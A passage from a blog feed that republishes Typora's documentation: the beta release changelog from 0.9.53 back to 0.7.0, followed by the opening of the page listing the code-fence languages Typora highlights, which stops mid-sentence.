bugs when <code>Indent first line of paragraph</code>is enabled.</li><li>Math block with Pandoc style attributes can be still parsed as Mathblock.</li><li>Search text will begin from current caret position, instead of startfrom document beginning.</li><li>Fix bug that sometimes Typora window is invisible on start.</li><li>Fix typo for language <code>sqlite</code>, add <code>tsx</code>,<code>stylus</code>, <code>julia</code> syntax highlight.</li><li>Language and other attribute of code fences will be included whenexport using Pandoc.</li><li>Support HTML Entity Number.</li><li>Improve logic about picking correct smart quotes. Fix smart pantsnot exported when using Pandoc.</li><li>Fix window will scroll to incorrect position when user input code ormath block.</li><li>Other bug fix.</li></ol><h2 id="beta-21">0.9.53 (beta)</h2><p>1, Jun, 2018</p><ol type="1"><li>Fix Markdown line break does not work.</li><li>Fix bugs relates to SmartyPants.</li><li>Fix return key on tables.</li><li>Fix mirror styles and typos.</li><li>Remove default shortcut keys of "typewriter" mode to prevent userfrom activating it accidentally and does not know how to exit.</li></ol><h2 id="beta-22">0.9.52 (beta)</h2><p>27, May, 2018</p><ol type="1"><li>Add Smart Punctuation (SmartyPants) Support.</li><li>Support remap unicode punctuations on parse. <a href="http://support.typora.io/SmartyPants">detail</a>.</li><li>Fix bugs on saving process.</li><li>Fix bugs that some options are not saved after change.</li><li>Fix bugs and improve UI of table functions.</li><li>Fix bug that styles inside underline (<code>&lt;u&gt;</code>) arenot rendered.</li><li>Fix undo/redo logic when changing styles or in source codemode.</li><li>Add syntax highlight for pseudocode.</li><li>Add Hungarian interface. Improve labels and translations.</li><li>Improve URL detect logic.</li><li>Other bug fix.</li></ol><h2 id="beta-23">0.9.51 (beta)</h2><p>15, May, 2018</p><ol type="1"><li>Add Croatian language.</li><li>Add Dependency on deb package.</li><li>Fix logic when quiting and open Typora.</li><li>other bug fix.</li></ol><h2 id="beta-24">0.9.50 (beta)</h2><p>4, May, 2018</p><ol type="1"><li>Fix a bug that some code fences cannot be edited.</li></ol><h2 id="beta-25">0.9.49 (beta)</h2><p>2, May, 2018</p><ol type="1"><li>Add option to reopen last files/folders or open custom folders onstart up.</li><li>Add 'Save All' command in menubar.</li><li>Allow escape <code>^</code> when superscript is enabled.</li><li>Better select word, delete word and triple click support.</li><li>Bug fix on typing in inline math.</li><li>Support launch flag in advanced setting.</li><li>Other bug fix.</li></ol><h2 id="beta-26">0.9.48 (beta)</h2><p>3, Apr, 2018</p><ol type="1"><li>Add options for preserve or ignore whitespace/single line break whenediting or export.</li><li>Update mermaid support and re-enable html labels in mermaiddiagram.</li><li>Use colored emoji on Windows.</li><li>Fix bugs on ordered lists.</li><li>Improve logic for auto pair.</li><li>Remember typewriter/focus mode on window close.</li><li>Improve syntax highlight logic in source code mode.</li><li>Fix bugs on editing files in One Drive.</li><li>Re-open unsaved content when restart Typora after crash.</li><li>Add Dutch language support.</li><li>Other bug fix.</li></ol><h2 id="beta-27">0.9.47 (beta)</h2><p>14, Mar, 2018</p><ol type="1"><li>Fix insert table or headins from enu not work in v0.9.46</li></ol><h2 id="beta-28">0.9.46 (beta)</h2><p>13, Mar, 2018</p><ol type="1"><li>Task lists follows GFM's spec (<a href="https://github.com/typora/typora-issues/issues/643">#643</a>). Youmay need to update your theme if your theme are downloaded.</li><li>Support disable auto-warp for code fences.</li><li>Support paste image directly. Add default actions and quick actionswhen insert images.</li><li>New language supports: German by <a href="https://github.com/rcvd">rcvd</a> and Gert, Czech by <a href="https://github.com/byDave251">byDave251</a>, Greek by <a href="https://github.com/typora/kiriakosv">kiriakosv</a>.</li><li>Add <code>mediawiki-texvc</code> support for math.</li><li>Improve UI for mermaid and sequence.</li><li>Fix bug for copy and resize table.</li><li>Improve export quotation for math equations for PDF, ePub and imageoutput.</li><li>Fix parsing errors for blockquote and emphasis.</li><li>Fix bugs relates to Chinese IME.</li><li>Other bug fix and improvements.</li></ol><h2 id="beta-29">0.9.44 (beta)</h2><p>9, Feb, 2018</p><ol type="1"><li>Fix bug that sometimes sidebar cannot be hide completely afterresize.</li><li>Use background on diagram nodes, fix hyperlink on flowchart cannotbe opened.</li><li>Improve URL auto detect logic.</li><li>Fix <code>****</code> cannot be parsed as<code>&lt;hr&gt;</code>.</li><li>Fix bug relates to context menu.</li><li>Other mirror fix.</li></ol><h2 id="beta-30">0.9.43 (beta)</h2><p>6, Feb, 2018</p><ol type="1"><li>New language support: Spanish by <a href="https://github.com/thepiratejester">thepiratejester</a>, French by<a href="https://github.comMOrdinateur">MOrdinateur</a>, Russian by <a href="https://github.com/dragomano">dragomano</a>, Japanese by <a href="https://github.com/tomochan001">tomochan001</a>, Portuguese by <a href="https://github.com/akz92">akz92</a>.</li><li>Improve parse logic for block quotes, lists, and tables.</li><li>Support custom tab size for code blocks. Add options for defaultordered list styles.</li><li>Improve compatibility with net drivers.</li><li>Fix <code>&lt;br&gt;</code> not exported.</li><li>Fix scrollbar on sidebar cannot be dragged.</li><li>Fix a bug that window may become invisible on start upsometimes.</li><li>Add syntax highlight for <code>SAS</code>.</li><li>Other bug fix.</li></ol><h2 id="beta-31">0.9.42 (beta)</h2><p>25, Jan, 2018</p><ol type="1"><li>Improve Simplified Chinese translation by <a href="https://github.com/NoDotCat">NoDotCat</a>, <a href="https://github.com/HowardTangHw">HowardTangHw</a>, <a href="https://github.com/Emphasia">Emphasia</a></li><li>More language support: Traditional Chinese translation (by <a href="https://github.com/cyberrob">cyberrob</a>), Polish translation (by<a href="https://github.com/iriusturar">iriusturar</a>), Koreantranslation (by <a href="https://github.com/ryush00">ryush00</a>, <a href="https://github.com/marigold9124">marigold9124</a>), Italiantranslation (by <a href="https://github.com/starise">starise</a>, <a href="https://github.com/jethro17">jethro17</a>).</li><li>Support resize on sidebar.</li><li>Add Privacy Policy.</li><li>Support quick open.</li><li>Fix some bugs for table editing.</li><li>Fix a bug that highlight, superscript, subscript, image and inlinemath is not rendered in outline.</li><li>Fix a bug that Typora may be opened in nonexistent display whenmultiple displays are used.</li><li>Some performance improvement on opening file.</li><li>Fix a bug that flowchart is not correctly rendered when Windowsstyle line ending is used.</li><li>Equation numbering is support after export as docx format for somemath formula.</li><li>Fix a word count bug for Korean language.</li><li>Fix bugs on list editing.</li><li>Other bug fix.</li></ol><h2 id="beta-32">0.9.41 (beta)</h2><p>14, Dec, 2017</p><ol type="1"><li>Add Chinese user interface.</li><li>Tables with long content supports scroll horizontally.</li><li>Improve PDF export, fix bugs relates to PDF export.</li><li>Add <a href="http://support.typora.io/Strict-Mode/">strict mode</a>option for parsing markdown.</li><li>Fix bug that cannot open correct link address for hyperlinksyntax.</li><li>Some fix bug about markdown parse logic.</li><li>Fix bugs about <code>[TOC]</code> .</li><li>Fix a bug that some options in advanced settings are notapplied.</li><li>Other bug fix.</li></ol><h2 id="beta-33">0.9.38 (beta)</h2><p>29, Oct, 2017</p><ol type="1"><li>Support <code>&lt;br/&gt;</code> tag in live rendering.</li><li>Update emoji library to cover emojis introduced during Unicode7.0~10.0</li><li>Add syntax highlight for twig.</li><li>Improve auto indent in code fences</li><li>Fix bug that file attributes are reset after save.</li><li>Fix bugs on PDF export.</li><li>Fix a bug that YAML does not follow CRLF preference.</li><li>Fix a bug that user cannot open folder from command linesometime.</li><li>Fix window restore logic relates to multiple screens.</li><li>Other bug fix.</li></ol><h2 id="beta-34">0.9.37 (beta)</h2><p>25, Sep, 2017</p><ol type="1"><li>Support show word count in selection.</li><li>Add syntax highlight for scheme.</li><li>Support natural sort in files panel.</li><li>Fix task list cannot be copy/pasted correctly.</li><li>Fix code fences padding on PDF export.</li><li>Other bug fix.</li></ol><h2 id="beta-35">0.9.36 (beta)</h2><p>26, Aug, 2017</p><ol type="1"><li>Fix a bug that user cannot jump using [TOC].</li><li>Fix on exported HTML, <code>@include-when-export</code> failed toconvert as <code>&lt;link&gt;</code>.</li></ol><h2 id="beta-36">0.9.34 (beta)</h2><p>24, Aug, 2017</p><ol type="1"><li>Add menu items for changing task list status.</li><li>Add syntax highlight for makefile, tcl.</li><li>Fix mermaid gantt cannot be rendered.</li><li>Fix backspace after emoji.</li><li>Fix window will scroll to top when switch from inactive window toactive one.</li><li>Fix a bug that sometimes <code>Return</code> does not work.</li><li>Hot fix for <code>-</code> will be converted to other character inexported PDF.</li><li>Fix a bug that typora cannot be opened from terminal multipletimes.</li><li>Other mirror fix.</li></ol><h2 id="beta-37">0.9.33 (beta)</h2><p>15, Aug, 2017</p><ol type="1"><li>Fix a critical bug that some code fences may crash the app.</li></ol><h2 id="beta-38">0.9.32 (beta)</h2><p>13, Aug, 2017</p><ol type="1"><li>Fix 100% CPU usage with menu on KDE on some linux distribution.</li><li>Fix some regression bug:<ol type="1"><li><code>Ctrl+-</code>/<code>Ctrl+=</code>/<code>ctrl+[</code>/<code>ctrl+]</code>not work as expect.</li><li>Auto pair for normal markdown characters does not work.</li><li>Fix for <code>&lt;img height="200" /&gt;</code> , the heightattribute won't be correctly added when rendering.</li><li>Performance improving when typing.</li><li>Zoom level sometimes is incorrect on startup.</li></ol></li><li><code>@import</code> and <code>@include-when-export</code> will beconverted to linked stylesheet when export to HTML.</li><li>Fix a bug that <code>ctrl</code>+click on hyperlink cannot openother protocol like <code>magic:</code> or others.</li><li>Fix a bug that selection should extend by word in some cases.</li><li>Fix a bug that after selection, the select anchor will always moveto its start boundary.</li><li>Ctrl+Ip/Down key and PageUp/PageDown key can exit code fences whenthe cursor is at start/end position of the code fences.</li><li>Better image select logic when editing: double click and auto selectall raw text of an image.</li><li>Can copy tables to Words from context menu.</li><li>Select word/select line also supports code fences and source codemode.</li></ol><h2 id="beta-39">0.9.30 (beta)</h2><p>9, Aug, 2017</p><ol type="1"><li>Support file tree/list in left side panel.</li><li>Start using CSS variable in themes. Change theme styles may beeasier.</li><li>Support relative link to files without adding <code>.md</code> or<code>.markdown</code> explicitly.</li><li>Diagrams can auto fit the max-width.</li><li>Improve auto detect logic for urls.</li><li>Fix exported HTML/PDF does not follow original markdown's logic ofline break.</li><li>Fix syntax highlight in night theme and syntax for protobuf, diffand php+html does not work.</li><li>Change some inappropriate descriptions in menu, dialog andtooltip.</li><li>Fix bug that some <code>&lt;a&gt;</code> tags are not parsedcorrectly.</li><li>No auto-pair for markdown symbols in inline math.</li><li>Support Chinese character in header anchors.</li><li>Fix bug of delete and return key on selected text or table.</li><li>Find/Replace input supports undo/redo and hit selection in codefences won't be removed.</li><li>Fix excepted HTML tags are not escaped in exported HTML.</li><li>Fix nav key on context menu</li><li>Fix bug that Math block cannot be copied.</li><li>Add tooltips on button.</li><li>Other bug fix.</li></ol><h2 id="beta-40">0.9.29 (beta)</h2><p>24, Apr, 2017</p><ol type="1"><li>Fix a critical bug.</li></ol><h2 id="beta-41">0.9.28 (beta)</h2><p>22, Apr, 2017</p><ol type="1"><li>Fix launch errors.</li></ol><h2 id="beta-42">0.9.27 (beta)</h2><p>17, Apr, 2017</p><ol type="1"><li>Support setting line ending char. Support CRLF line ending.</li><li>Add syntax highlight support for <code>ProtoBuf</code>, fix syntaxhighlight for <code>php+html</code> and <code>diff</code>.</li><li>Fix styles for "unibody" style.</li><li>Fix font not applied when exporting.</li><li>Improve copy/paste to prevent data or style lost.</li><li>Fix key navigation on context menu.</li><li>Fix a few typos in text resource.</li><li>Fix header anchor cannot support some unicode char.</li><li>Fix spellcheck sometimes not working in Linux.</li></ol><h2 id="beta-43">0.9.25 (beta)</h2><p>09, Mar, 2017</p><ol type="1"><li>Fix "import" does not work.</li><li>Imporve encoding detecting logic for better compatibility.</li></ol><h2 id="beta-44">0.9.24 (beta)</h2><p>27, Feb, 2017</p><ol type="1"><li>Support <code>alt</code> key on Windows to popup related menu.</li><li>Support open recent files from menubar.</li><li>Fix a bug that Typora cannot detect the encode of some filescorrectly. Allow manually select file encode from menubar.</li><li>Fix bugs that table headers and bold Chinese characters cannot beprinted (export to PDF) correctly.</li><li>Fix crash when export contents into jpg file.</li><li>Show horizontal scrollbar when some table or dialog is toowidth.</li><li>Set default extensions for save and export dialog.</li><li>Add syntax highligh for <code>fortran</code>. Fix bugs of syntaxhighlight function for <code>Scala</code> and <code>C#</code>.</li><li>Exported HTML (without class) for code fences could follow w3crecommendations and be more friendly with Prism.</li><li>Fix some bugs relates to crash and data lose.</li><li>Fix bugs that some behavior for links are not correct.</li><li>Fix table parsing logic for special characters.</li><li>Fix a bug that some math block is invalid in exported EPub.</li><li>Fix a bug that <code>\&#123;</code> is not correctly handled in inlinemath.</li><li>Other bug fix.</li></ol><h2 id="beta-45">0.9.23 (beta)</h2><p>4, Jan, 2017</p><ol type="1"><li>Support move table row/col when drag on left/top side of tablerow/col or using shortcut keys: shift + ctrl + arrow key.</li><li>Add syntax highlighting for <code>cmake</code>, <code>cypher</code>,<code>dart</code>, <code>django</code>, <code>dtd</code>,<code>dylan</code>, <code>handlebars</code>, <code>idl</code>,<code>web idl</code>, <code>yacas</code>, <code>mbox</code>,<code>vhdl</code>, <code>julia</code>, <code>haxe</code>, and<code>hxml</code>.</li><li>Remove <code>//</code> after <code>mailto:</code> for auto generatedmail link.</li><li>Fix image position for flowchart.</li><li>Fix a bug that some link url or image url are escaped twice.</li><li>Fix a bug that <code>:+1:</code> is not recognized as emoji.</li><li>Fix refresh mathjax will convert inline math when inline math is notenabled.</li><li>Fix freeze when insert images.</li><li>Other bug fix and improvements.</li></ol><h2 id="beta-46">0.9.22 (beta)</h2><p>20, Nov, 2016</p><ol type="1"><li>Fix the logic for relative path for<code>typora-root-url</code>.</li><li>Support recent used files on Windows jumplist.</li><li>Support paste images into Typora(after set-up).</li><li>Support copy images to selected folder when insert images.</li><li>Fix bugs related to collapsible outline panel.</li><li>Fix bugs that exported PDF may contain HTML in bookmark.</li><li>Fix bugs about undo/redo for nest task list.</li><li>Fix mermaid no responding when Chinese character exists.</li><li>Change <code>Copy as Markdown</code> option from opt-in toopt-out.</li><li>Support elixir for code fences.</li><li>Fix cli support on Linux.</li><li>Fix some typo on interface.</li></ol><h2 id="beta-47">0.9.21 (beta)</h2><p>18, Oct, 2016</p><ol type="1"><li>Support insert image from local file. Support drag &amp; dropmultiple images.</li><li>Add preference to use relative path when insert images.</li><li>Improve footnote export and behavior.</li><li>Add option for auto-numbering math blocks. Support command forrefreshing math expression.</li><li>Add option set left outline panel collapsible.</li><li>Support <code>&lt;img&gt;</code> tag without a close tag.</li><li>Remove unnecessary math delimiter for exported LaTeX.</li><li>Add syntax highlight for <code>ocaml</code>, <code>F#</code>,<code>elm</code>, <code>spreadsheet</code> and<code>pgp(Ascii Armor)</code>.</li><li>Auto-save time schedule can be configured in advanced options.</li></ol><h2 id="beta-48">0.9.20 (beta)</h2><p>6, Oct, 2016</p><ol type="1"><li>Add support for simple HTML fragments, only includes:<code>&lt;!--comments--&gt;</code>,<code>&lt;a href="http://typora.io"&gt;link&lt;/a&gt;</code>,<code>&lt;img src="http://www.w3.org/html/logo/img/mark-word-icon.png" width="200px" /&gt;</code>.</li><li>Fix syntax highlight for <code>Octave</code> is not working, and add<code>matlab</code> as its alias.</li><li>Math expressions now support export to epub. Diagrams will beconverted to images when export to epub/docx.</li><li>Fix a bug that arrow of diagrams is missing when export toHTML/PDF.</li><li>Fix a critical bug on tables.</li><li>Fix some export options are missing in <code>Export</code>menu.</li><li>Other bug fix.</li></ol><h2 id="beta-49">0.9.19 (beta)</h2><p>26, Sep, 2016</p><ol type="1"><li>Launched our <a href="http://theme.typora.io">Theme Gallery</a> toshare and download Typora themes.</li><li>Fix a bug the menubar won't show automatically when Typora isfullscreened.</li><li>Improve paste behavior.</li><li>Fix unnecessary scroll.</li><li>Fix backspace after UTF-32 character.</li><li>Fix bugs related to inline code inside table.</li><li>Recover outline panel status when switch from source code mode.</li><li>Other bug fix.</li><li>A Linux build (Debian/Ubuntu) is <a href="https://typora.io/#linux">available</a>.</li></ol><h2 id="beta-50">0.9.18 (beta)</h2><p>4, Sep, 2016</p><ol type="1"><li>Add options to auto pair common markdown symbols, like `*_ etc.</li><li>Add options to show markdown source for simple blocks when focus,like headings.</li><li>Fix a bug that sometimes special characters will cause inline mathnot rendered.</li><li>Fix a bug that sometime <code>Enter</code> key is not working.</li><li>Fix some bugs under high DPI screen.</li><li>Fix a bug that footnote definition cannot be correctly input.</li></ol><h2 id="beta-51">0.9.17 (beta)</h2><p>27, Aug, 2016</p><ol type="1"><li>Fix special characters cannot be input inside inline math.</li><li>Fix backspace cannot expand inline style.</li></ol><h2 id="beta-52">0.9.16 (beta)</h2><p>19, Aug, 2016</p><ol type="1"><li>Support diagrams, includes sequence, flowchart and mermaid (<a href="http://support.typora.io/Draw-Diagrams-With-Markdown/">doc</a>).</li><li>Fix a bug related to parsing <code>*</code> and escapedcharacter.</li><li>Fix backspace inside code fences.</li><li>Fix escape character will gone in inline math, inline code, andother inline styles.</li><li>Fix special character, such as <code>#</code> cannot be inserted inceylon code block.</li><li>Fix quote mark would cause typora not respond sometimes.</li><li>Allow custom keybindings (<a href="http://support.typora.io/Custom-Key-Binding/">doc</a>).</li><li>Allow custom search service (<a href="http://support.typora.io/Add-Search-Service/">doc</a>).</li><li>Fix shift+ctrl+home/end key on Windows.</li><li>Other bug fix and improvements.</li></ol><h2 id="beta-53">0.9.15 (beta)</h2><p>29, Jul, 2016</p><ol type="1"><li>Fix a bug that <code>**</code> is not correctly parsed.</li><li>Fix bookmark not generated when export to PDF when there's h5 and h6in article.</li><li>Fix list indentation not correctly saved.</li><li>Fix footnotes contains "_" cannot be exported correctly.</li><li>Fix a bug some file format cannot be exported via pandoc.</li><li>Add "Textile" as one export option.</li><li>Improve URL auto detection.</li><li>Fix content will be pasted twice when paste from typora toWord.</li><li>Other bug fix.</li></ol><h2 id="beta-54">0.9.14 (beta)</h2><p>25, Jul, 2016</p><ol type="1"><li>Fix print/export PDF not work.</li></ol><h2 id="beta-55">0.9.13 (beta)</h2><p>24, Jul, 2016</p><ol type="1"><li>Release x64 build.</li><li>Add focus mode and typewriter mode support.</li><li>Remember last status of outline bar.</li><li>Add syntax support for assembly and TOML.</li><li>Avoid the usage of 'AltGr' key combination in assignedshortcut.</li><li>Support kramdown style <code>[toc]</code> syntax.</li><li>Improve list indent/outdent logic.</li><li>Fix HTML entities not escaped in meta block.</li><li>Fix a bug that triple click cannot select current linecorrectly.</li><li>Fix auto indent for brackets in code fences.</li><li>Add options to export reStructuredText, and OPML format.</li><li>Fix user.css not included in exported HTML/PDF.</li><li>Fix some export option not work in unibody window style.</li><li>Fix cannot export/print in dark theme.</li><li>Other bug fix.</li></ol><h2 id="beta-56">0.9.12 (beta)</h2><p>22, Jun, 2016</p><ol type="1"><li>Fix a critical bug that the indent in multi-level lists may keepincreasing after save.</li><li>Fix the scrollbar style on side panel.</li></ol><h2 id="beta-57">0.9.11 (beta)</h2><p>21, Jun, 2016</p><ol type="1"><li>Fix a critical bug that the indents of multi-level lists are wrongwhen parsing and generating markdown source.</li><li>Better ECMAScript6 syntax highlight support for javascript codefences. Add syntax highlight support for NSIS, JSX (<a href="http://facebook.github.io/react">React</a>'s JavaScript syntaxextension), vue, LiveScript, mathematica, properties (and .ini), tikiwiki, dockerfile in code fences.</li><li>Hide auto-complete lists when scrolling.</li><li>Fix internal link to heading (like <a href="#0.9.4.5-(beta)">this</a>) not work.</li><li>Fix a bug sometimes, pasting would append duplicate texts.</li><li>Rule change: capitalized characters are not allowed in filenames fortheme css file</li><li>Make link clickable in about page.</li><li>Support single column table in insert table dialog.</li><li>Add enabled optional inline style support, like highlight or inlinemath, in menubar.</li></ol><h2 id="beta-58">0.9.10 (beta)</h2><p>15, Jun, 2016</p><ol type="1"><li>Fix style that sometimes user can see script content.</li><li>Fix auto pair match inside image and avoid glitch when completebrackets.</li><li>Fix paste table, and paste inside footnotes.</li><li>Fix <code>]</code> cannot be escaped in footnotes.</li><li>Fix <code>h6</code> indent inside <code>[TOC]</code>.</li><li>Fix multiple level lists inside blockquote cannot be parsedcorrectly.</li><li>Enable ESC key to close insert table dialog.</li><li>Fix outline sidebar jumpping around when scrolling.</li><li>Fix ctrl+home/end not working.</li></ol><h2 id="beta-59">0.9 (beta)</h2><p>2, Jun, 2016</p><ol type="1"><li>Fix a bug that Typora cannot be launched by opening md files on PCswithout <em>Visual C++ library</em> installed.</li></ol><h2 id="beta-60">0.9.8 (beta)</h2><p>1, Jun, 2016</p><ol type="1"><li>Fix a critical bug about saving in source code mode.</li><li>Fix save dialog keep poping up sometimes.</li><li>Improve logic for auto match paired quotes and brackets.</li><li>Fix inline math cannot be exported to some file types viapandoc.</li><li>Fix a bug that improper file name is auto generated when the articlecontains YAML forn matters.</li></ol><h2 id="beta-61">0.9.7 (beta)</h2><p>30, May, 2016</p><ol type="1"><li>Fix typora.exe is misreported by some anti virus software.</li></ol><h2 id="beta-62">0.9.6 (beta)</h2><p>27, May, 2016</p><ol type="1"><li>Add mobile "responsive" support for exported HTML.</li><li>Pandoc requires 1.16 and above. Fix exporting fail usingPandoc.</li><li>Better support for monitoring file content change by externalapps.</li><li>Fix generating PDF takes too much time and reduce file size for PDF.Also fix a bug anchor link in PDF not working and Chinese character inprinted PDF is not selectable.</li><li>Fix shortcut keys for <code>h6</code> not working.</li><li>Add syntax highlight for Powershell.</li><li>Remember windows size when creating new window.</li><li>Can open <code>.md</code> file from <code>cmd.exe</code> directly,if typora is its default reader.</li><li>Fix that some advance options not work. Add options to auto hidemenu bar.</li><li>Fix a critical bug in paste/undo which may case data lose.</li><li>Make <code>\label</code> work in math block.</li><li>Fix unnecessary empty char in inserted footnote.</li><li>Fix auto pair match and find&amp;replace in math block.</li><li>Fix up/down key behavior on code fences.</li><li>Fix some HTML code (like <code>&amp;phone;</code>) not escaped ininline code.</li><li>Other bug fix.</li></ol><h2 id="beta-63">0.9.5 (beta)</h2><p>5, May, 2016</p><ol type="1"><li>Add pandoc integration, import function and export function fordocx, rtf, LaTeX, etc.</li><li>Able to open <code>.md</code> file or import supported files by dragand drop into typora's window.</li><li>Fix a bug that sometimes PDF cannot be exported correctly.</li><li>Fix <code>H4</code> style in <code>pixyll</code> theme.</li><li>Fix sql mode error for code blocks.</li><li>Fix a bug for parsing headers with underline style.</li><li>Fix a bug for undo/redo for editing lists.</li><li>Fix a bug when pasting lists.</li><li>Other bug fix.</li></ol><h2 id="beta-64">0.9.4 (beta)</h2><p>23, Apr, 2016</p><ol type="1"><li>Fix LaTeX is not correctly exported after opening existingfiles.</li><li>Fix a bug which may cause content inside list items get lost.</li><li>Fix wrong indent for content inside list after parsing rawmarkdown.</li><li>Support "Open File Location" action.</li><li>Fix a bug that if image path contains special chars like quotes, theimage cannot be displayed correctly.</li><li>Fix a bug related to paste lists.</li><li>Fix a bug some line breaks disappear in exported PDF.</li></ol><h2 id="beta-65">0.9.3 (beta)</h2><p>19, Apr, 2016</p><ol type="1"><li>Fix the wrong bookmark structure in exported PDF.</li><li>Fix sometimes Chinese characters cannot be saved to filecorrectly.</li><li>In exported HTML, file name will be set to<code>&lt;title&gt;</code> tag.</li></ol><h2 id="beta-66">0.9.2 (beta)</h2><p>18, Apr, 2016</p><ol type="1"><li>Better save feature: Support file auto save (need enable it frompreference panel) and allow users to recover unsaved drafts formpreference panel.</li><li>Better word count: Now click word count button from status bar,detailed info would show.</li><li>Better Print: Fix a bug that current window, instead of generatedweb view woulc be printted.</li><li>Better PDF exporting: Now exported PDF could contains Table ofContents as bookmarks, just like Mac version</li><li>Better fullscreen mode: Fullscreen mode can auto show menu bar fornative style windows, and auto show/hide title bar control buttons forunibody windows. Newly created windows would also be fullscreen infullscreen mode.</li><li>Fix table cannot be deleted in the beginning of the article.</li><li>Fix a bug that some lines will be duplicated after open.</li><li>Fix files on external disks cannot be opened.</li><li>Other bug fix.</li></ol><h2 id="beta-67">0.9.1 (beta)</h2><p>6, Apr, 2016</p><ol type="1"><li>Fix a critical bug for saving.</li><li>Fix a critical bug for task list.</li></ol><h2 id="beta-68">0.9.0 (beta)</h2><p>4, Apr, 2016</p><ol type="1"><li>Rewrite typora's Markdown parse engine and largely improve theperformance on opening mid-sized files.</li><li>Fix bugs for pair auto-complete.</li><li>Fix bugs for Korean IME.</li><li>Fix a bug that typora will eat and replace non-breaking space.</li><li>Fix relative image path on exported HTML.</li><li>Fix a bug typora will detech wrong encoding sometimes.</li><li>Other bugs.</li></ol><h2 id="beta-69">0.8.8 (beta)</h2><p>13, Mar, 2016</p><ol type="1"><li>Fix minor parse issue for URL, subscript and superscript.</li><li>Fix compatibility issue between Chinese IME and auto-pairfeature</li><li>Include and autoload MathJax extension, including chemistry packageand others (e.g. <span class="math inline">\(\ce{C6H5-CHO}\)</span>).</li><li>Fix bug triggered by pressing <code>ctrl+`</code> twice.</li><li>Fix some menu item under "Edit" submenu does not work.</li><li>Support open hyperlink from context menu.</li><li>Other bug fix.</li></ol><h2 id="beta-70">0.8.6 (beta)</h2><p>4, Mar, 2016</p><ol type="1"><li>Fix a critical bug on Delete key.</li></ol><h2 id="beta-71">0.8.5 (beta)</h2><p>3, Mar, 2016</p><ol type="1"><li>Support ==highlight== syntax (should enable it from preferencepanel).</li><li>Support auto complete pairs of brackets, quotes andparentheses.</li><li>Fix bugs on lists.</li><li>Fix cut on windows.</li><li>Fix selection styles in code fences, python code in code fences willuse 4-space indent.</li><li>Fix customize font size, local image, local font does not work forexported PDF.</li><li>Fix bugs for LaTeX editing/rendering.</li><li>Auto insert path/urls from clipboard when insert images/hyperlinksfrom menubar or shortcut keys.</li><li>Other bug fix.</li></ol><h2 id="beta-72">0.8.3 (beta)</h2><p>24, Feb, 2015</p><ol type="1"><li>Add basic support for editing in source code mode directly.</li><li>Support signle line break (shift+return).</li><li>Improve LaTeX rendering quality.</li><li>Support non-UTF8/16 encoded files, includes Shift-JIS, Big5, EUC-JP,EUC-KR, GB18030, ISO-8859-1, ISO-8859-2, ISO-8859-5, ISO-8859-6,ISO-8859-7, ISO-8859-8, ISO-8859-9, windows-1250, windows-1251,windows-1252, windows-1253, windows-1254, windows-1255, windows-1256.Other encodings is not supported yet.</li><li>Fix bug that tab+subbullet will be parsed as code fences.</li><li>Fix syntax highlight support for PHP, SQL, Objective-c, etc.</li><li>Fix then behavior when pressing ctrl or shift and arrow key.</li><li>Fix bugs in find/replace.</li><li>Fix small bugs in exported HTMLs.</li><li>Support drag &amp; drop to insert images and fix images not shownwith relative path.</li><li>Fix cut &amp; paste function.</li></ol><h2 id="beta-73">0.7.7 (beta)</h2><p>11, Jun, 2015</p><ol type="1"><li>Imporve stability and reliability on saving</li></ol><h2 id="beta-74">0.7.6 (beta)</h2><p>3, Jun, 2015</p><ol type="1"><li>Fix a critical bug which may cause data lose.</li><li>Fix syntax parse for task list.</li><li>Improve theme <code>newsprint</code>.</li><li>Fix the unnecessary io operation when starting Typora.</li></ol><h2 id="beta-75">0.7.5 (beta)</h2><p>24, DEC, 2015</p><p>First beta version.</p><h2 id="alpha">0.7.0 (alpha)</h2><p>19, DEC, 2015</p><p>First alpha version.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Code%20Fences%20Language%20Support/"/>
    <url>/2024/12/03/algorithm-enhance/Typora/resources/app/Docs/Code%20Fences%20Language%20Support/</url>
    
    <content type="html"><![CDATA[<h1 id="code-fences-language-support">Code Fences Language Support</h1><p>The latest version of Typora support syntax highlight of followinglanguages (in lower case):</p><ul><li>asp (alias: aspx, asp.net)</li><li>javascript (alias: js, text/javascript)</li><li>json</li><li>typescript</li><li>clojure</li><li>coffeescript (alias: coffee)</li><li>css</li><li>less</li><li>scss</li><li>gfm (github flavored markdown)</li><li>markdown</li><li>xml</li><li>haskell</li><li>html (alias: htmlmixed)</li><li>lua</li><li>commonlisp (alias: lisp)</li><li>pascal</li><li>perl</li><li>php (and php+html)</li><li>cython</li><li>python</li><li>ruby</li><li>shell (alias: sh, bash)</li><li>sql</li><li>sqlite</li><li>mssql</li><li>mysql</li><li>mariadb</li><li>cql (alias: cassandra)</li><li>plsql</li><li>tex (and stex, latex)</li><li>tiddlywiki (alias: wiki)</li><li>vb (alias: basic)</li><li>vbscript</li><li>velocity</li><li>verilog</li><li>xquery</li><li>yaml</li><li>go</li><li>groovy</li><li>nginx</li><li>octave (alias: matlab)</li><li>oz</li><li>c (alias: clike)</li><li>c++ (alias: cpp, cc)</li><li>objective-c (alias: obj-c, objc)</li><li>scala</li><li>c# (alias: csharp)</li><li>java</li><li>squirrel</li><li>ceylon</li><li>kotlin</li><li>swift</li><li>r (alias: rlang, r-lang)</li><li>d</li><li>diff</li><li>erlang</li><li>http</li><li>jade</li><li>rst (alias: restructuredtext)</li><li>rust</li><li>jinja2</li><li>jsp</li><li>erb</li><li>embeddedjs (alias: ejs)</li><li>powershell</li><li>dockerfile</li><li>jsx (alias: react)</li><li>vue (alias: vue.js, vue-template)</li><li>nsis</li><li>tiki (alias: tikiwiki, tiki-wiki)</li><li>properties (alias: ini)</li><li>livescript</li><li>assembly (alias: asm, nasm, gas)</li><li>toml</li><li>ocaml</li><li>F#</li><li>elm</li><li>elixir</li><li>spreadsheet</li><li>pgp (alias: asciiarmor, pgp-keys)</li><li>cmake</li><li>cypher</li><li>dart</li><li>django</li><li>dtd (alias: xml-dtd)</li><li>dylan</li><li>handlebars</li><li>idl</li><li>web-idl</li><li>yacas</li><li>mbox</li><li>bhdl</li><li>julia</li><li>haxe</li><li>hxml</li><li>pseudocode</li><li>SAS</li><li>twig</li><li>scheme</li><li>tcl</li><li>makefile</li><li>protobuf</li><li>fortran</li><li>COBOL</li></ul><p>Please note that the language you specific in <code>```&#123;lang&#125;</code>is case insensitive for typora when choose the corresponding syntaxhighlight.</p><h3 id="my-language-is-not-listed-above...">My language is not listedabove...</h3><p>Typora use CodeMirror for code fences with syntax highlight, so, 